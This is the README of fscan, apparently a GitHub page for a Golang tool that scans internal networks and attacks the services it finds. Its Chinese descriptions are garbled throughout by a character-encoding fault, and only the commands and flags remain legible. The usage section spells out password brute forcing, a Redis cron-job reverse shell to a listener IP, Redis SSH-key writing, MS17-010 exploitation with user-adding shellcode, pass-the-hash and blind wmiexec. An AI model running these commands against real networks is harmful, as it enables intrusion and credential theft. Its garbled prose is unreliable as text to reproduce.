# fscan
[English][url-docen]

# 1. ç®€ä»‹
fscan æ˜¯ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çˆ†ç ´ã€æ¼æ´æ‰«æç­‰åŠŸèƒ½ã€‚å·¥å…·ä½¿ç”¨ Golang å¼€å‘ï¼Œå…·æœ‰æ‰«æé€Ÿåº¦å¿«ã€è·¨å¹³å°ã€å®¹æ˜“æ‰©å±•ç­‰ç‰¹ç‚¹ã€‚

ä¸»è¦ç”¨äºå†…ç½‘çš„ä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥ç”¨äºå¤§è§„æ¨¡ç½‘ç»œçš„å¿«é€Ÿæ¢æµ‹å’Œæ¼æ´æ‰«æã€‚æ”¯æŒç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«ã€æ¼æ´æ‰«æã€å¼±å£ä»¤çˆ†ç ´ç­‰ã€‚

# 2. ä¸»è¦åŠŸèƒ½
1. ä¿¡æ¯æœé›†:
* ä¸»æœºå­˜æ´»æ¢æµ‹ (ICMP/PING)
* ç«¯å£æ‰«æ (æ”¯æŒæŒ‡å®šç«¯å£ã€ç«¯å£ç»„)
* ç½‘å¡ä¿¡æ¯æ”¶é›†

2. çˆ†ç ´åŠŸèƒ½:
* æœåŠ¡çˆ†ç ´ (SSHã€SMBã€RDPã€WMIç­‰)
* æ•°æ®åº“å¯†ç çˆ†ç ´ (MySQLã€MSSQLã€Redisã€PostgreSQLã€Oracleã€MongoDBç­‰)
* æ”¯æŒè‡ªå®šä¹‰ç”¨æˆ·åå¯†ç å­—å…¸

3. ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ:  
* NetBIOS æ¢æµ‹ã€åŸŸæ§è¯†åˆ«
* é«˜å±æ¼æ´æ‰«æ (MS17010ã€CVE-2020-0796ç­‰)
* æœªæˆæƒè®¿é—®æ£€æµ‹

4. Webæ¢æµ‹åŠŸèƒ½:
* Webæ ‡é¢˜æ¢æµ‹
* WebæŒ‡çº¹è¯†åˆ« (CMSã€OAæ¡†æ¶ç­‰)
* Webæ¼æ´æ‰«æ (æ”¯æŒXray POC)
* æ”¯æŒè‡ªå®šä¹‰POC

5. æ¼æ´åˆ©ç”¨:
* Redis å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹Shell
* SSH å‘½ä»¤æ‰§è¡Œ
* MS17010 æ¼æ´åˆ©ç”¨
* WMI æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ

6. å…¶ä»–åŠŸèƒ½:
* ç»“æœä¿å­˜ (æ”¯æŒJSONæ ¼å¼)
* ä»£ç†æ”¯æŒ (HTTP/SOCKS5)
* æ§åˆ¶å°å½©è‰²è¾“å‡º

# 3. ä½¿ç”¨è¯´æ˜
ç®€å•ç”¨æ³•
``` 
fscan.exe -h 192.168.1.1/24  (é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—)
fscan.exe -h 192.168.1.1/16  (Bæ®µæ‰«æ)
```

å…¶ä»–ç”¨æ³•
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(è·³è¿‡å­˜æ´»æ£€æµ‹ ã€ä¸ä¿å­˜æ–‡ä»¶ã€è·³è¿‡web pocæ‰«æ)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis å†™å…¬é’¥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis è®¡åˆ’ä»»åŠ¡åå¼¹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh çˆ†ç ´æˆåŠŸåï¼Œå‘½ä»¤æ‰§è¡Œ)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (æŒ‡å®šæ¨¡å—sshå’Œç«¯å£)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (åŠ è½½æŒ‡å®šæ–‡ä»¶çš„ç”¨æˆ·åã€å¯†ç æ¥è¿›è¡Œçˆ†ç ´)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (æŒ‡å®šæ‰«æç»“æœä¿å­˜è·¯å¾„,é»˜è®¤ä¿å­˜åœ¨å½“å‰è·¯å¾„) 
fscan.exe -h 192.168.1.1/8  (Aæ®µçš„192.x.x.1å’Œ192.x.x.254,æ–¹ä¾¿å¿«é€ŸæŸ¥çœ‹ç½‘æ®µä¿¡æ¯ )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smbå¯†ç ç¢°æ’)
fscan.exe -h 192.168.1.1/24 -m ms17010 (æŒ‡å®šæ¨¡å—)
fscan.exe -hf ip.txt  (ä»¥æ–‡ä»¶å¯¼å…¥)
fscan.exe -u http://baidu.com -proxy 8080 (æ‰«æå•ä¸ªurl,å¹¶è®¾ç½®httpä»£ç† http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (ä¸è¿›è¡Œçˆ†ç ´,ä¸æ‰«Web poc,ä»¥å‡å°‘æµé‡)
fscan.exe -h 192.168.1.1/24 -pa 3389 (åœ¨åŸåŸºç¡€ä¸Š,åŠ å…¥3389->rdpæ‰«æ)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (åªæ”¯æŒç®€å•tcpåŠŸèƒ½çš„ä»£ç†,éƒ¨åˆ†åŠŸèƒ½çš„åº“ä¸æ”¯æŒè®¾ç½®ä»£ç†)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (å†…ç½®æ·»åŠ ç”¨æˆ·ç­‰åŠŸèƒ½,åªé€‚ç”¨äºå¤‡é€‰å·¥å…·,æ›´æ¨èå…¶ä»–ms17010çš„ä¸“é¡¹åˆ©ç”¨å·¥å…·)
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hashç¢°æ’,xxxx:ntlmhash,å¦‚32ed87bdb5fdc5e9cba88547376818d4)
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexecæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ)
```
ç¼–è¯‘å‘½ä»¤
```
go build -ldflags="-s -w " -trimpath main.go
upx -9 fscan.exe (å¯é€‰,å‹ç¼©ä½“ç§¯)
```
archç”¨æˆ·å®‰è£…  
`yay -S fscan-git  æˆ–è€… paru -S fscan-git`

å®Œæ•´å‚æ•°
```
  -c string
        sshå‘½ä»¤æ‰§è¡Œ
  -cookie string
        è®¾ç½®cookie
  -debug int
        å¤šä¹…æ²¡å“åº”,å°±æ‰“å°å½“å‰è¿›åº¦(default 60)
  -domain string
        smbçˆ†ç ´æ¨¡å—æ—¶,è®¾ç½®åŸŸå
  -h string
        ç›®æ ‡ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        è¯»å–æ–‡ä»¶ä¸­çš„ç›®æ ‡
  -hn string
        æ‰«ææ—¶,è¦è·³è¿‡çš„ip: -hn 192.168.1.1/24
  -m string
        è®¾ç½®æ‰«ææ¨¡å¼: -m ssh (default "all")
  -no
        æ‰«æç»“æœä¸ä¿å­˜åˆ°æ–‡ä»¶ä¸­
  -nobr
        è·³è¿‡sqlã€ftpã€sshç­‰çš„å¯†ç çˆ†ç ´
  -nopoc
        è·³è¿‡web pocæ‰«æ
  -np
        è·³è¿‡å­˜æ´»æ¢æµ‹
  -num int
        web poc å‘åŒ…é€Ÿç‡  (default 20)
  -o string
        æ‰«æç»“æœä¿å­˜åˆ°å“ª (default "result.txt")
  -p string
        è®¾ç½®æ‰«æçš„ç«¯å£: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        æ–°å¢éœ€è¦æ‰«æçš„ç«¯å£,-pa 3389 (ä¼šåœ¨åŸæœ‰ç«¯å£åˆ—è¡¨åŸºç¡€ä¸Š,æ–°å¢è¯¥ç«¯å£)
  -path string
        fcgiã€smb romote file path
  -ping
        ä½¿ç”¨pingä»£æ›¿icmpè¿›è¡Œå­˜æ´»æ¢æµ‹
  -pn string
        æ‰«ææ—¶è¦è·³è¿‡çš„ç«¯å£,as: -pn 445
  -pocname string
        æŒ‡å®šweb pocçš„æ¨¡ç³Šåå­—, -pocname weblogic
  -proxy string
        è®¾ç½®ä»£ç†, -proxy http://127.0.0.1:8080
  -user string
        æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·å
  -userf string
        æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·åæ–‡ä»¶
  -pwd string
        æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç 
  -pwdf string
        æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç æ–‡ä»¶
  -rf string
        æŒ‡å®šrediså†™å…¬é’¥ç”¨æ¨¡å—çš„æ–‡ä»¶ (as: -rf id_rsa.pub)
  -rs string
        redisè®¡åˆ’ä»»åŠ¡åå¼¹shellçš„ipç«¯å£ (as: -rs 192.168.1.1:6666)
  -silent
        é™é»˜æ‰«æ,é€‚åˆcsæ‰«ææ—¶ä¸å›æ˜¾
  -sshkey string
        sshè¿æ¥æ—¶,æŒ‡å®šsshç§é’¥
  -t int
        æ‰«æçº¿ç¨‹ (default 600)
  -time int
        ç«¯å£æ‰«æè¶…æ—¶æ—¶é—´ (default 3)
  -u string
        æŒ‡å®šUrlæ‰«æ
  -uf string
        æŒ‡å®šUrlæ–‡ä»¶æ‰«æ
  -wt int
        webè®¿é—®è¶…æ—¶æ—¶é—´ (default 5)
  -pocpath string
        æŒ‡å®špocè·¯å¾„
  -usera string
        åœ¨åŸæœ‰ç”¨æˆ·å­—å…¸åŸºç¡€ä¸Š,æ–°å¢æ–°ç”¨æˆ·
  -pwda string
        åœ¨åŸæœ‰å¯†ç å­—å…¸åŸºç¡€ä¸Š,å¢åŠ æ–°å¯†ç 
  -socks5
        æŒ‡å®šsocks5ä»£ç† (as: -socks5  socks5://127.0.0.1:1080)
  -sc 
        æŒ‡å®šms17010åˆ©ç”¨æ¨¡å—shellcode,å†…ç½®æ·»åŠ ç”¨æˆ·ç­‰åŠŸèƒ½ (as: -sc add)
```

# 4. è¿è¡Œæˆªå›¾

`fscan.exe -h 192.168.x.x  (å…¨åŠŸèƒ½ã€ms17010ã€è¯»å–ç½‘å¡ä¿¡æ¯)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis å†™å…¬é’¥)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh å‘½ä»¤)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 ä¸€é”®æ”¯æŒxrayçš„poc`
![](image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«,ä¸‹å›¾çš„[+]DCä»£è¡¨åŸŸæ§)`
![](image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbiosæ—¶,æ‰ä¼šæ˜¾ç¤ºå®Œæ•´çš„netbiosä¿¡æ¯)`
![](image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp(æ¢æµ‹æ¯ä¸ªCæ®µçš„ç½‘å…³å’Œæ•°ä¸ªéšæœºIP,å¹¶ç»Ÿè®¡top 10 Bã€Cæ®µå­˜æ´»æ•°é‡)`
![img.png](image/live.png)

# 5. å…è´£å£°æ˜

æœ¬å·¥å…·ä»…é¢å‘**åˆæ³•æˆæƒ**çš„ä¼ä¸šå®‰å…¨å»ºè®¾è¡Œä¸ºï¼Œå¦‚æ‚¨éœ€è¦æµ‹è¯•æœ¬å·¥å…·çš„å¯ç”¨æ€§ï¼Œè¯·è‡ªè¡Œæ­å»ºé¶æœºç¯å¢ƒã€‚

ä¸ºé¿å…è¢«æ¶æ„ä½¿ç”¨ï¼Œæœ¬é¡¹ç›®æ‰€æœ‰æ”¶å½•çš„pocå‡ä¸ºæ¼æ´çš„ç†è®ºåˆ¤æ–­ï¼Œä¸å­˜åœ¨æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä¸ä¼šå¯¹ç›®æ ‡å‘èµ·çœŸå®æ”»å‡»å’Œæ¼æ´åˆ©ç”¨ã€‚

åœ¨ä½¿ç”¨æœ¬å·¥å…·è¿›è¡Œæ£€æµ‹æ—¶ï¼Œæ‚¨åº”ç¡®ä¿è¯¥è¡Œä¸ºç¬¦åˆå½“åœ°çš„æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¸”å·²ç»å–å¾—äº†è¶³å¤Ÿçš„æˆæƒã€‚**è¯·å‹¿å¯¹éæˆæƒç›®æ ‡è¿›è¡Œæ‰«æã€‚**

å¦‚æ‚¨åœ¨ä½¿ç”¨æœ¬å·¥å…·çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä»»ä½•éæ³•è¡Œä¸ºï¼Œæ‚¨éœ€è‡ªè¡Œæ‰¿æ‹…ç›¸åº”åæœï¼Œæˆ‘ä»¬å°†ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ã€‚

åœ¨å®‰è£…å¹¶ä½¿ç”¨æœ¬å·¥å…·å‰ï¼Œè¯·æ‚¨**åŠ¡å¿…å®¡æ…é˜…è¯»ã€å……åˆ†ç†è§£å„æ¡æ¬¾å†…å®¹**ï¼Œé™åˆ¶ã€å…è´£æ¡æ¬¾æˆ–è€…å…¶ä»–æ¶‰åŠæ‚¨é‡å¤§æƒç›Šçš„æ¡æ¬¾å¯èƒ½ä¼šä»¥åŠ ç²—ã€åŠ ä¸‹åˆ’çº¿ç­‰å½¢å¼æç¤ºæ‚¨é‡ç‚¹æ³¨æ„ã€‚
é™¤éæ‚¨å·²å……åˆ†é˜…è¯»ã€å®Œå…¨ç†è§£å¹¶æ¥å—æœ¬åè®®æ‰€æœ‰æ¡æ¬¾ï¼Œå¦åˆ™ï¼Œè¯·æ‚¨ä¸è¦å®‰è£…å¹¶ä½¿ç”¨æœ¬å·¥å…·ã€‚æ‚¨çš„ä½¿ç”¨è¡Œä¸ºæˆ–è€…æ‚¨ä»¥å…¶ä»–ä»»ä½•æ˜ç¤ºæˆ–è€…é»˜ç¤ºæ–¹å¼è¡¨ç¤ºæ¥å—æœ¬åè®®çš„ï¼Œå³è§†ä¸ºæ‚¨å·²é˜…è¯»å¹¶åŒæ„æœ¬åè®®çš„çº¦æŸã€‚


# 6. 404StarLink 2.0 - Galaxy
![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

fscan æ˜¯ 404Team [æ˜Ÿé“¾è®¡åˆ’2.0](https://github.com/knownsec/404StarLink2.0-Galaxy) ä¸­çš„ä¸€ç¯ï¼Œå¦‚æœå¯¹fscan æœ‰ä»»ä½•ç–‘é—®åˆæˆ–æ˜¯æƒ³è¦æ‰¾å°ä¼™ä¼´äº¤æµï¼Œå¯ä»¥å‚è€ƒæ˜Ÿé“¾è®¡åˆ’çš„åŠ ç¾¤æ–¹å¼ã€‚

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)

æ¼”ç¤ºè§†é¢‘[ã€å®‰å…¨å·¥å…·ã€‘5å¤§åŠŸèƒ½ï¼Œä¸€é”®åŒ–å†…ç½‘æ‰«æç¥å™¨â€”â€”404æ˜Ÿé“¾è®¡åˆ’fscan](https://www.bilibili.com/video/BV1Cv4y1R72M)
# 7. Star Chart
[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)

# 8. æèµ 
 å¦‚æœä½ è§‰å¾—è¿™ä¸ªé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·ä½œè€…å–é¥®æ–™ğŸ¹ [ç‚¹æˆ‘](image/sponsor.png)

# 9. å‚è€ƒé“¾æ¥
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc


# 10. æœ€è¿‘æ›´æ–°
[+] 2024/1/1 ä¼˜åŒ–ç”¨æˆ·åå’Œå¯†ç å­—å…¸ï¼Œå¢åŠ æ›´å¤šå¸¸è§ç»„åˆã€‚å¢å¼ºæœåŠ¡è¯†åˆ«å‡†ç¡®æ€§ã€‚  
[+] 2023/11/13 åŠ å…¥æ§åˆ¶å°é¢œè‰²è¾“å‡º(-nocolor)ã€ä¿å­˜æ–‡ä»¶jsonç»“æ„(-json)ã€ä¿®æ”¹tlsæœ€ä½ç‰ˆæœ¬ä¸º1.0ã€ç«¯å£åˆ†ç»„(-p db,web,service)ã€‚  
[+] 2023/10/1 ä¼˜åŒ–æ‰«ææ€§èƒ½ï¼Œæå‡æ‰«æé€Ÿåº¦ã€‚å¢åŠ æ›´å¤šWebæŒ‡çº¹ã€‚  
[+] 2023/8/15 å¢åŠ æ›´å¤šPOCï¼Œå®Œå–„æ¼æ´æ‰«æåŠŸèƒ½ã€‚ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚  
[+] 2023/6/20 å¢å¼ºåŸŸæ§è¯†åˆ«åŠŸèƒ½ï¼Œæ”¹è¿›NetBIOSæ¢æµ‹ã€‚  
[+] 2023/4/10 æ”¹è¿›æœåŠ¡è¯†åˆ«æ¨¡å—ï¼Œæé«˜å‡†ç¡®ç‡ã€‚ä¼˜åŒ–æ‰«æé€»è¾‘ã€‚  
[+] 2023/2/1 å¢åŠ æ›´å¤šæ•°æ®åº“ç±»å‹æ”¯æŒï¼Œå®Œå–„çˆ†ç ´åŠŸèƒ½ã€‚  
[+] 2022/11/19 åŠ å…¥hashç¢°æ’ã€wmiexecæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œã€‚  
[+] 2022/7/14 -hf æ”¯æŒhost:portå’Œhost/xx:portæ ¼å¼,rule.Search æ­£åˆ™åŒ¹é…èŒƒå›´ä»bodyæ”¹æˆheader+body,-nobrä¸å†åŒ…å«-nopocã€‚ä¼˜åŒ–webtitle è¾“å‡ºæ ¼å¼ã€‚  
[+] 2022/7/6 åŠ å…¥æ‰‹å·¥gcå›æ”¶,å°è¯•èŠ‚çœæ— ç”¨å†…å­˜ã€‚-url æ”¯æŒé€—å·éš”å¼€ã€‚ä¿®å¤ä¸€ä¸ªpocæ¨¡å—bugã€‚-nobrä¸å†åŒ…å«-nopocã€‚  

[url-docen]: README_EN.md
